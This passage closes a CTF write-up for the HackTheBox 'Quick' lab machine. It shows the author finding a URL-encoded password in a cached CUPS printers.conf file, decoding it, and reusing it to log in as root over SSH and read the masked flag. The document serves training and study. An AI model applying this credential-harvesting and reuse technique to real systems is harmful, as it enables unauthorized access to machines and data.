+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">srvadm@quick:~$ ls -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-xr-x 6 srvadm srvadm 4096 Mar 20 06:37 .</span><br><span class="line">drwxr-xr-x 4 root   root   4096 Mar 20 02:16 ..</span><br><span class="line">lrwxrwxrwx 1 srvadm srvadm    9 Mar 20 02:38 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 srvadm srvadm  220 Mar 20 02:16 .bash_logout</span><br><span class="line">-rw-r--r-- 1 srvadm srvadm 3771 Mar 20 02:16 .bashrc</span><br><span class="line">drwx------ 5 srvadm srvadm 4096 Mar 20 06:20 .cache</span><br><span class="line">drwx------ 3 srvadm srvadm 4096 Mar 20 02:38 .gnupg</span><br><span class="line">drwxrwxr-x 3 srvadm srvadm 4096 Mar 20 06:37 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r-- 1 srvadm srvadm  807 Mar 20 02:16 .profile</span><br><span class="line">drwx------ 2 srvadm srvadm 4096 Mar 20 02:38 .ssh</span><br></pre></td></tr></table></figure>
+
+<p>The <code>.cache/</code> folder might hold valuable cached informations. While looking around in the cached configuration file we find something interesting: another file in relation with printers in <code>~/.cache/conf.d/printers.conf</code>.</p>
+<p>Inside we find a odd string:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">srvadm@quick:~$ cat .cache/conf.d/printers.conf</span><br><span class="line"><span class="comment"># Printer configuration file for CUPS v2.3.0</span></span><br><span class="line">[...]</span><br><span class="line">DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer</span><br></pre></td></tr></table></figure>
+
+<p>URLDecoding it returns:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer</span><br></pre></td></tr></table></figure>
+
+<p>Could <code>&amp;ftQ4K3SGde8?</code> be the <code>root</code> account password?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh root@quick.htb</span><br><span class="line">root@quick.htb<span class="string">'s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Mon Apr 20 08:01:18 2020</span></span><br><span class="line"><span class="string">root@quick:~# ls</span></span><br><span class="line"><span class="string">docker-compose.yml  fullchain.pem  nginx.conf  portal  privkey.pem  root.txt</span></span><br><span class="line"><span class="string">root@quick:~# cat root.txt</span></span><br><span class="line"><span class="string">7xxxxxxxxxxxxxxxxxxxxxxxxxx7</span></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p>
+<p>See you next time ;)</p>
+<p>-hg8</p>
+
+  </div>
+</article>
+<br>
+<br>
+
+
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/HackTheBox/">HackTheBox</a> › <a class="category-link" href="/categories/CTF/HackTheBox/Hard-Box/">Hard Box</a>
+    </div>
+
+
+
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CUPS/" rel="tag">CUPS</a>, <a class="tag-link" href="/tags/ESI-injection/" rel="tag">ESI injection</a>, <a class="tag-link" href="/tags/custom-exploitation/" rel="tag">custom exploitation</a>, <a class="tag-link" href="/tags/esigate/" rel="tag">esigate</a>, <a class="tag-link" href="/tags/http3/" rel="tag">http3</a>, <a class="tag-link" href="/tags/linux/" rel="tag">linux</a>, <a class="tag-link" href="/tags/printer/" rel="tag">printer</a>, <a class="tag-link" href="/tags/quick/" rel="tag">quick</a>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Posts</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP3-gt-portal-quick-htb"><span class="toc-number">1.2.</span> <span class="toc-text">HTTP3 -&gt; portal.quick.htb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Client-credentials"><span class="toc-number">1.3.</span> <span class="toc-text">Client credentials</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ESI-Injection-to-remote-code-execution"><span class="toc-number">1.4.</span> <span class="toc-text">ESI Injection to remote code execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Automating-ESI-injection-to-RCE"><span class="toc-number">1.5.</span> <span class="toc-text">Automating ESI injection to RCE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-sam-gt-srvadm"><span class="toc-number">2.2.</span> <span class="toc-text">Pivot sam -&gt; srvadm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cached-configuration"><span class="toc-number">2.3.</span> <span class="toc-text">Cached configuration</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020
+    <a href="https://hg8.sh">hg8.sh</a>
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Archives</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/atom.xml">RSS</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+    
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/js/main.js"></script>
+
+
+
+
+</body>
+</html>
